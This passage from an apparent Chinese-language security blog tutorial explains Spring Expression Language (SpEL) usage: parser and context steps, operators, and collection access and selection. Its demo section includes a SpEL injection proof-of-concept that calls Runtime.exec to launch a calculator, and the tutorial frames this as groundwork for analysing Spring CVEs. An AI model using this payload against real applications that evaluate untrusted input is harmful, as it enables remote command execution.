+<h4 id="Expression用法"><a href="#Expression用法" class="headerlink" title="Expression用法"></a>Expression用法</h4><p>由于后续分析的各种Spring CVE漏洞都是基于Expression形式的SpEL表达式注入，因此这里再单独说明SpEL表达式Expression这种形式的用法。</p>
+<h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><blockquote>
+<p>SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(<span class="string">"('Hello' + ' Mi1k7ea').concat(#end)"</span>);</span><br><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setVariable(<span class="string">"end"</span>, <span class="string">"!"</span>);</span><br><span class="line">System.out.println(expression.getValue(context));</span><br></pre></td></tr></table></figure>
+<p>具体步骤如下：</p>
+<ol>
+<li>创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；</li>
+<li>解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；</li>
+<li>构造上下文：准备比如变量定义等等表达式需要的上下文数据；</li>
+<li>求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；</li>
+</ol>
+<h5 id="主要接口"><a href="#主要接口" class="headerlink" title="主要接口"></a>主要接口</h5><ul>
+<li><strong>ExpressionParser 接口</strong>：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；</li>
+<li><strong>EvaluationContext 接口</strong>：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。</li>
+<li><strong>Expression 接口</strong>：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。</li>
+</ul>
+<h5 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo"></a>Demo</h5><p>应用示例如下，和前面XML配置的用法区别在于程序会将这里传入parseExpression()函数的字符串参数当初SpEL表达式来解析，而无需通过<code>#{}</code>符号来注明：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串字面量</span></span><br><span class="line"><span class="comment">//String spel = "123+456";</span></span><br><span class="line"><span class="comment">// 算数运算</span></span><br><span class="line"><span class="comment">//String spel = "123+456";</span></span><br><span class="line"><span class="comment">// 操作类弹计算器，当然java.lang包下的类是可以省略包名的</span></span><br><span class="line">String spel = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"calc\")"</span>;</span><br><span class="line"><span class="comment">// String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(spel);</span><br><span class="line">System.out.println(expression.getValue());</span><br></pre></td></tr></table></figure>
+<h5 id="类实例化"><a href="#类实例化" class="headerlink" title="类实例化"></a>类实例化</h5><p>类实例化同样使用Java关键字new，类名必须是全限定名，但java.lang包内的类型除外。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String spel = <span class="string">"new java.util.Date()"</span>;</span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(spel);</span><br><span class="line">System.out.println(expression.getValue());</span><br></pre></td></tr></table></figure>
+<h3 id="SpEL表达式运算"><a href="#SpEL表达式运算" class="headerlink" title="SpEL表达式运算"></a>SpEL表达式运算</h3><p>下面内容引用自<a href="https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" target="_blank" rel="noopener">SpEL表达式</a>。</p>
+<p>SpEL提供了以下几种运算符：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">运算符类型</th>
+<th style="text-align:left">运算符</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">算数运算</td>
+<td style="text-align:left">+, -, *, /, %, ^</td>
+</tr>
+<tr>
+<td style="text-align:left">关系运算</td>
+<td style="text-align:left">&lt;, &gt;, ==, &lt;=, &gt;=, lt, gt, eq, le, ge</td>
+</tr>
+<tr>
+<td style="text-align:left">逻辑运算</td>
+<td style="text-align:left">and, or, not, !</td>
+</tr>
+<tr>
+<td style="text-align:left">条件运算</td>
+<td style="text-align:left">?:(ternary), ?:(Elvis)</td>
+</tr>
+<tr>
+<td style="text-align:left">正则表达式</td>
+<td style="text-align:left">matches</td>
+</tr>
+</tbody>
+</table>
+<h4 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h4><p>加法运算：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"add"</span> <span class="attr">value</span>=<span class="string">"#&#123;counter.total+42&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>加号还可以用于字符串拼接：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"blogName"</span> <span class="attr">value</span>=<span class="string">"#&#123;my blog name is+' '+mrBird &#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>^</code>运算符执行幂运算，其余算数运算符和Java一毛一样，这里不再赘述。</p>
+<h4 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h4><p>判断一个Bean的某个属性是否等于100：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"eq"</span> <span class="attr">value</span>=<span class="string">"#&#123;counter.total==100&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>返回值是boolean类型。关系运算符唯一需要注意的是：在Spring XML配置文件中直接写&gt;=和&lt;=会报错。因为这”&lt;”和”&gt;”两个符号在XML中有特殊的含义。所以实际使用时，最号使用文本类型代替符号：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">运算符</th>
+<th style="text-align:left">符号</th>
+<th style="text-align:left">文本类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">等于</td>
+<td style="text-align:left">==</td>
+<td style="text-align:left">eq</td>
+</tr>
+<tr>
+<td style="text-align:left">小于</td>
+<td style="text-align:left">&lt;</td>
+<td style="text-align:left">lt</td>
+</tr>
+<tr>
+<td style="text-align:left">小于等于</td>
+<td style="text-align:left">&lt;=</td>
+<td style="text-align:left">le</td>
+</tr>
+<tr>
+<td style="text-align:left">大于</td>
+<td style="text-align:left">&gt;</td>
+<td style="text-align:left">gt</td>
+</tr>
+<tr>
+<td style="text-align:left">大于等于</td>
+<td style="text-align:left">&gt;=</td>
+<td style="text-align:left">ge</td>
+</tr>
+</tbody>
+</table>
+<p>如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"eq"</span> <span class="attr">value</span>=<span class="string">"#&#123;counter.total le 100&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>SpEL表达式提供了多种逻辑运算符，其含义和Java也是一毛一样，只不过符号不一样罢了。</p>
+<p>使用and运算符：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"largeCircle"</span> <span class="attr">value</span>=<span class="string">"#&#123;shape.kind == 'circle' and shape.perimeter gt 10000&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>两边为true时才返回true。</p>
+<p>其余操作一样，只不过非运算有<code>not</code>和<code>!</code>两种符号可供选择。非运算：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"outOfStack"</span> <span class="attr">value</span>=<span class="string">"#&#123;!product.available&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="条件运算"><a href="#条件运算" class="headerlink" title="条件运算"></a>条件运算</h4><p>条件运算符类似于Java的三目运算符：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"instrument"</span> <span class="attr">value</span>=<span class="string">"#&#123;songSelector.selectSong() == 'May Rain' ? piano:saxphone&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当选择的歌曲为”May Rain”的时候，一个id为piano的Bean将装配到instrument属性中，否则一个id为saxophone的Bean将装配到instrument属性中。注意区别piano和字符串“piano”！</p>
+<p>一个常见的三目运算符的使用场合是判断是否为null值：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.song !=null ? kenny.song:'Jingle Bells'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里，kenny.song引用重复了两次，SpEL提供了三目运算符的变体来简化表达式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.song !=null ?:'Jingle Bells'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在以上示例中，如果kenny.song不为null，那么表达式的求值结果是kenny.song否则就是“Jingle Bells”。</p>
+<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>验证邮箱：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"#&#123;admin.email matches '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.com'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>虽然这个邮箱正则不够健壮，但对于演示matches来说足够啦。</p>
+<h3 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h3><p>SpEL表达式支持对集合进行操作。</p>
+<p>下面我们以示例看下能进行哪些集合操作。</p>
+<p>我们先创建一个City类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">City</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String state;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> population;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(String state)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.state = state;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPopulation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> population;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPopulation</span><span class="params">(<span class="keyword">int</span> population)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.population = population;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修改Beans.xml，使用<code>&lt;util:list&gt;</code>元素配置一个包含City对象的List集合：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:util</span>=<span class="string">"http://www.springframework.org/schema/util"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/util</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/util/spring-util-4.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">util:list</span> <span class="attr">id</span>=<span class="string">"cities"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Chicago"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"IL"</span> <span class="attr">p:population</span>=<span class="string">"2853114"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Atlanta"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"GA"</span> <span class="attr">p:population</span>=<span class="string">"537958"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Dallas"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"1279910"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Houston"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"2242193"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Odessa"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"90943"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"El Paso"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"TX"</span> <span class="attr">p:population</span>=<span class="string">"613190"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Jal"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"NM"</span> <span class="attr">p:population</span>=<span class="string">"1996"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.City"</span> <span class="attr">p:name</span>=<span class="string">"Las Cruces"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">p:state</span>=<span class="string">"NM"</span> <span class="attr">p:population</span>=<span class="string">"91865"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">util:list</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="访问集合成员"><a href="#访问集合成员" class="headerlink" title="访问集合成员"></a>访问集合成员</h4><p>SpEL表达式支持通过<code>#{集合ID[i]}</code>的方式来访问集合中的成员。</p>
+<p>定义一个ChoseCity类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChoseCity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> City city;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCity</span><span class="params">(City city)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.city = city;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> City <span class="title">getCity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> city;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在Beans.xml中，选取集合中的某一个成员，并赋值给city属性中：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"choseCity"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.ChoseCity"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"city"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities[0]&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>MainApp.java，实例化这个Bean：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        ChoseCity c = (ChoseCity)context.getBean(<span class="string">"choseCity"</span>);</span><br><span class="line">        System.out.println(c.getCity().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行无误则输出”Chicago”。</p>
+<p>随机地选择一个city，中括号<code>[]</code>运算符始终通过索引访问集合中的成员：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"city"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities[T(java.lang.Math).random()*cities.size()]&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时会随机访问一个集合成员并输出。</p>
+<blockquote>
+<p><code>[]</code>运算符同样可以用来获取java.util.Map集合中的成员。例如，假设City对象以其名字作为键放入Map集合中，在这种情况下，我们可以像下面那样获取键为Dallas的entry：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"chosenCity"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities['Dallas']&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p><code>[]</code>运算符的另一种用法是从java.util.Properties集合中取值。例如，假设我们需要通过<code>&lt;util:properties&gt;</code>元素在Spring中加载一个properties配置文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">util:properties</span> <span class="attr">id</span>=<span class="string">"settings"</span> <span class="attr">loaction</span>=<span class="string">"classpath:settings.properties"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>现在要在这个配置文件Bean中访问一个名为twitter.accessToken的属性：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"accessToken"</span> <span class="attr">value</span>=<span class="string">"#&#123;settings['twitter.accessToken']&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p><code>[]</code>运算符同样可以通过索引来得到某个字符串的某个字符，例如下面的表达式将返回s：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &apos;This is a test&apos;[3]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="查询集合成员"><a href="#查询集合成员" class="headerlink" title="查询集合成员"></a>查询集合成员</h4><p>SpEL表达式中提供了查询运算符来实现查询符合条件的集合成员：</p>
+<ul>
+<li><code>.?[]</code>：返回所有符合条件的集合成员；</li>
+<li><code>.^[]</code>：从集合查询中查出第一个符合条件的集合成员；</li>
+<li><code>.$[]</code>：从集合查询中查出最后一个符合条件的集合成员；</li>
+</ul>
+<p>修改ChoseCity类，将city属性类型改为City列表类型：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChoseCity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;City&gt; city;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;City&gt; <span class="title">getCity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> city;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCity</span><span class="params">(List&lt;City&gt; city)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.city = city;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修改Beans.xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"choseCity"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.ChoseCity"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"city"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities.?[population gt 100000]&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>修改MainApp.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        ChoseCity c = (ChoseCity)context.getBean(<span class="string">"choseCity"</span>);</span><br><span class="line">        <span class="keyword">for</span>(City city:c.getCity())&#123;</span><br><span class="line">            System.out.println(city.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Chicago</span><br><span class="line">Atlanta</span><br><span class="line">Dallas</span><br><span class="line">Houston</span><br><span class="line">El Paso</span><br></pre></td></tr></table></figure>
